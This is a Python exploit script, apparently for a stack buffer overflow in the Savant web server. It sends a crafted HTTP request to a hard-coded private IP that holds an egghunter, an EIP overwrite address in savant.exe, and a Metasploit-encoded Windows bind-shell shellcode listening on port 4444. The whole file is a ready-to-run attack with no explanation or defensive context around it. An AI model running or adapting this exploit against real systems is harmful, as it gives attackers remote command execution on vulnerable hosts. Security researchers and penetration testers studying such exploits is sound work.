#!/usr/bin/python
import socket
 
target_address="192.168.233.132"
target_port=80
 
buf = "R0cX" + "R0cX"
# msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -e x86/shikata_ga_nai -c 4 -t c
buf += "\xd9\xe5\xba\xcd\x23\xbb\x67\xd9\x74\x24\xf4\x5d\x33"
buf += "\xc9\xb1\x53\x83\xc5\x04\x31\x55\x13\x03\x98\x30\x59"
buf += "\x92\xde\xdf\x1f\x5d\x1e\x20\x40\xd7\xfb\x11\x40\x83"
buf += "\x88\x02\x70\xc7\xdc\xae\xfb\x85\xf4\x25\x89\x01\xfb"
buf += "\x8e\x24\x74\x32\x0e\x14\x44\x55\x8c\x67\x99\xb5\xad"
buf += "\xa7\xec\xb4\xea\xda\x1d\xe4\xa3\x91\xb0\x18\xc7\xec"
buf += "\x08\x93\x9b\xe1\x08\x40\x6b\x03\x38\xd7\xe7\x5a\x9a"
buf += "\xd6\x24\xd7\x93\xc0\x29\xd2\x6a\x7b\x99\xa8\x6c\xad"
buf += "\xd3\x51\xc2\x90\xdb\xa3\x1a\xd5\xdc\x5b\x69\x2f\x1f"
buf += "\xe1\x6a\xf4\x5d\x3d\xfe\xee\xc6\xb6\x58\xca\xf7\x1b"
buf += "\x3e\x99\xf4\xd0\x34\xc5\x18\xe6\x99\x7e\x24\x63\x1c"
buf += "\x50\xac\x37\x3b\x74\xf4\xec\x22\x2d\x50\x42\x5a\x2d"
buf += "\x3b\x3b\xfe\x26\xd6\x28\x73\x65\xbf\x9d\xbe\x95\x3f"
buf += "\x8a\xc9\xe6\x0d\x15\x62\x60\x3e\xde\xac\x77\x41\xf5"
buf += "\x09\xe7\xbc\xf6\x69\x2e\x7b\xa2\x39\x58\xaa\xcb\xd1"
buf += "\x98\x53\x1e\x4f\x90\xf2\xf1\x72\x5d\x44\xa2\x32\xcd"
buf += "\x2d\xa8\xbc\x32\x4d\xd3\x16\x5b\xe6\x2e\x99\x72\xab"
buf += "\xa7\x7f\x1e\x43\xee\x28\xb6\xa1\xd5\xe0\x21\xd9\x3f"
buf += "\x59\xc5\x92\x29\x5e\xea\x22\x7c\xc8\x7c\xa9\x93\xcc"
buf += "\x9d\xae\xb9\x64\xca\x39\x37\xe5\xb9\xd8\x48\x2c\x29"
buf += "\x78\xda\xab\xa9\xf7\xc7\x63\xfe\x50\x39\x7a\x6a\x4d"
buf += "\x60\xd4\x88\x8c\xf4\x1f\x08\x4b\xc5\x9e\x91\x1e\x71"
buf += "\x85\x81\xe6\x7a\x81\xf5\xb6\x2c\x5f\xa3\x70\x87\x11"
buf += "\x1d\x2b\x74\xf8\xc9\xaa\xb6\x3b\x8f\xb2\x92\xcd\x6f"
buf += "\x02\x4b\x88\x90\xab\x1b\x1c\xe9\xd1\xbb\xe3\x20\x52"
buf += "\xcb\xa9\x68\xf3\x44\x74\xf9\x41\x09\x87\xd4\x86\x34"
buf += "\x04\xdc\x76\xc3\x14\x95\x73\x8f\x92\x46\x0e\x80\x76"
buf += "\x68\xbd\xa1\x52"

 
badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # egghunter searching for R0cX
badbuffer += "\x90" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN
httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14
 
sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buf
 
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()
